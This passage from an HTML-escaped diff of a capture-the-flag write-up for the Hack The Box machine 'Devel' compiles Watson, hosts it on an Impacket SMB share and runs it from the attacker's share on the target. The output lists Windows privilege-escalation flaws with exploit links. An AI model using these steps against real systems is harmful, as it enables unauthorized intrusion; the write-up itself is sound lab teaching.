+&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;----&lt;/span&gt;         &lt;span class="n"&gt;14&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;7&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2009&lt;/span&gt;   &lt;span class="n"&gt;7&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;56&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt;            &lt;span class="n"&gt;v3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;                              
+&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;----&lt;/span&gt;         &lt;span class="n"&gt;14&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;7&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2009&lt;/span&gt;   &lt;span class="n"&gt;7&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;52&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt;            &lt;span class="n"&gt;v3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;5&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Version 3.5 is very popular, and Watson should be compatible.  We can set the target build Framework in the project Properties menu under Application.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Setting to .NET 3.5 for execution" src="images/ctf/htb/devel/watson_set_dotnet_ver.png"&gt;&lt;/p&gt;
+&lt;p&gt;Once that's done, we set the solution to Release and Build (Ctrl + B).  Now we can copy the compiled binary and host it on Kali.&lt;/p&gt;
+&lt;p&gt;We can allow Devel access to Watson and any other binaries we create by hosting it on a public SMB share.  Impackets &lt;code&gt;smbserver&lt;/code&gt; utility is perfect for this.&lt;/p&gt;
+&lt;h4&gt;Impacket smbserver&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# /usr/bin/impacket-smbserver -smb2support share .&lt;/span&gt;
+Impacket v0.9.20 - Copyright &lt;span class="m"&gt;2019&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Config file parsed
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Callback added &lt;span class="k"&gt;for&lt;/span&gt; UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Callback added &lt;span class="k"&gt;for&lt;/span&gt; UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Config file parsed
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Config file parsed
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Config file parsed
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This will allow all content in the current directory to be accessible by SMB at &lt;code&gt;\\&amp;lt;VPN IP&amp;gt;\share\&lt;/code&gt;.  Now we should be able to execute Watson without touching disk!&lt;/p&gt;
+&lt;h4&gt;Watson.exe&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;PS &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Public&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Documents&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;\\&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;14&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;22&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Watson&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;
+  &lt;span class="n"&gt;__&lt;/span&gt;    &lt;span class="n"&gt;__&lt;/span&gt;      &lt;span class="n"&gt;_&lt;/span&gt;
+ &lt;span class="p"&gt;/&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt; &lt;span class="p"&gt;/\&lt;/span&gt; &lt;span class="p"&gt;\&lt;/span&gt; &lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="n"&gt;___&lt;/span&gt;  &lt;span class="n"&gt;___&lt;/span&gt;  &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="n"&gt;__&lt;/span&gt;
+ &lt;span class="p"&gt;\&lt;/span&gt; &lt;span class="p"&gt;\/&lt;/span&gt;  &lt;span class="p"&gt;\/&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;`&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt; &lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="p"&gt;|/&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="p"&gt;\|&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="p"&gt;\&lt;/span&gt;
+  &lt;span class="p"&gt;\&lt;/span&gt;  &lt;span class="p"&gt;/\&lt;/span&gt;  &lt;span class="p"&gt;/&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt; &lt;span class="p"&gt;\&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
+   &lt;span class="p"&gt;\/&lt;/span&gt;  &lt;span class="p"&gt;\/&lt;/span&gt; &lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;|\&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="n"&gt;___&lt;/span&gt;&lt;span class="p"&gt;/\&lt;/span&gt;&lt;span class="n"&gt;___&lt;/span&gt;&lt;span class="p"&gt;/|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;
+
+                           &lt;span class="n"&gt;v0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;
+
+                  &lt;span class="n"&gt;Sherlock&lt;/span&gt; &lt;span class="n"&gt;sucks&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
+                   &lt;span class="nv"&gt;@_RastaMouse&lt;/span&gt;
+
+ &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;OS&lt;/span&gt; &lt;span class="n"&gt;Build&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;7600&lt;/span&gt;
+ &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;CPU&lt;/span&gt; &lt;span class="n"&gt;Address&lt;/span&gt; &lt;span class="n"&gt;Width&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;32&lt;/span&gt;
+ &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="k"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;IntPtr&lt;/span&gt; &lt;span class="n"&gt;Size&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;4&lt;/span&gt;
+ &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Using&lt;/span&gt; &lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;WINDOWS&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;System32&lt;/span&gt;
+
+  &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Appears&lt;/span&gt; &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;MS10&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;073&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Description&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Kernel-mode&lt;/span&gt; &lt;span class="n"&gt;drivers&lt;/span&gt; &lt;span class="n"&gt;load&lt;/span&gt; &lt;span class="n"&gt;unspecified&lt;/span&gt; &lt;span class="n"&gt;keyboard&lt;/span&gt; &lt;span class="n"&gt;layers&lt;/span&gt; &lt;span class="n"&gt;improperly&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;which&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;arbitrary&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="n"&gt;execution&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;kernel&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Exploit&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit-db&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;exploits&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;36327&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Notes&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+  &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Appears&lt;/span&gt; &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;MS10&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;092&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Description&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;When&lt;/span&gt; &lt;span class="n"&gt;processing&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="n"&gt;Task&lt;/span&gt; &lt;span class="n"&gt;Scheduler&lt;/span&gt; &lt;span class="n"&gt;only&lt;/span&gt; &lt;span class="n"&gt;uses&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;CRC32&lt;/span&gt; &lt;span class="n"&gt;checksum&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;validate&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;been&lt;/span&gt; &lt;span class="n"&gt;tampered&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt;
+&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Also&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;In&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;normal&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;read&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;write &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;they&lt;/span&gt; &lt;span class="n"&gt;have&lt;/span&gt; &lt;span class="n"&gt;created&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;By&lt;/span&gt; &lt;span class="n"&gt;modifying&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;creating&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;CRC32&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;
+&lt;span class="n"&gt;ollision&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;attacker&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;execute&lt;/span&gt; &lt;span class="n"&gt;arbitrary&lt;/span&gt; &lt;span class="n"&gt;commands&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;SYSTEM&lt;/span&gt; &lt;span class="n"&gt;privileges&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Exploit&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;//&lt;/span&gt;&lt;span class="n"&gt;github&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;rapid7&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;metasploit-framework&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;master&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;exploits&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;windows&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ms10_092_schelevator&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rb&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Notes&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+  &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Appears&lt;/span&gt; &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;MS11&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;046&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Description&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;Ancillary&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt; &lt;span class="n"&gt;Driver&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AFD&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;afd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt; &lt;span class="n"&gt;does&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;properly&lt;/span&gt; &lt;span class="n"&gt;validate&lt;/span&gt; &lt;span class="n"&gt;user-mode&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;which&lt;/span&gt; &lt;span class="n"&gt;allows&lt;/span&gt; &lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;elevate&lt;/span&gt; &lt;span class="n"&gt;privile&lt;/span&gt;
+&lt;span class="n"&gt;ges&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Exploit&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit-db&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;exploits&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;40564&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Notes&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+  &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Appears&lt;/span&gt; &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;MS12&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;042&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Description&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;An&lt;/span&gt; &lt;span class="n"&gt;EoP&lt;/span&gt; &lt;span class="n"&gt;exists&lt;/span&gt; &lt;span class="n"&gt;due&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;way&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="n"&gt;User&lt;/span&gt; &lt;span class="n"&gt;Mode&lt;/span&gt; &lt;span class="n"&gt;Scheduler&lt;/span&gt; &lt;span class="n"&gt;handles&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;which&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;be&lt;/span&gt; &lt;span class="n"&gt;exploited&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;execute&lt;/span&gt; &lt;span class="n"&gt;arbitrary&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;
+ &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;kernel&lt;/span&gt; &lt;span class="n"&gt;mode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Exploit&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;//&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exploit-db&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;exploits&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;20861&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Notes&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+  &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Appears&lt;/span&gt; &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;MS13&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;005&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Description&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Due&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;problem&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;isolating&lt;/span&gt; &lt;span class="n"&gt;window&lt;/span&gt; &lt;span class="n"&gt;broadcast&lt;/span&gt; &lt;span class="n"&gt;messages&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="n"&gt;kernel&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;attacker&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;broadcast&lt;/span&gt; &lt;span class="n"&gt;commands&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;lower&lt;/span&gt; &lt;span class="n"&gt;Integ&lt;/span&gt;
+&lt;span class="n"&gt;rity&lt;/span&gt; &lt;span class="n"&gt;Level&lt;/span&gt; &lt;span class="k"&gt;process&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;higher&lt;/span&gt; &lt;span class="n"&gt;Integrity&lt;/span&gt; &lt;span class="n"&gt;Level&lt;/span&gt; &lt;span class="k"&gt;process&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;thereby&lt;/span&gt; &lt;span class="n"&gt;effecting&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;privilege&lt;/span&gt; &lt;span class="n"&gt;escalation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Exploit&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;//&lt;/span&gt;&lt;span class="n"&gt;github&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;rapid7&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;metasploit-framework&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;master&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;exploits&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;windows&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ms13_005_hwnd_broadcast&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rb&lt;/span&gt;
+   &lt;span class="p"&gt;[&amp;gt;]&lt;/span&gt; &lt;span class="n"&gt;Notes&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;None&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+ &lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;Finished&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Found&lt;/span&gt; &lt;span class="n"&gt;5&lt;/span&gt; &lt;span class="n"&gt;vulns&lt;/span&gt; &lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ERROR&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;given&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;present&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;dictionary&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
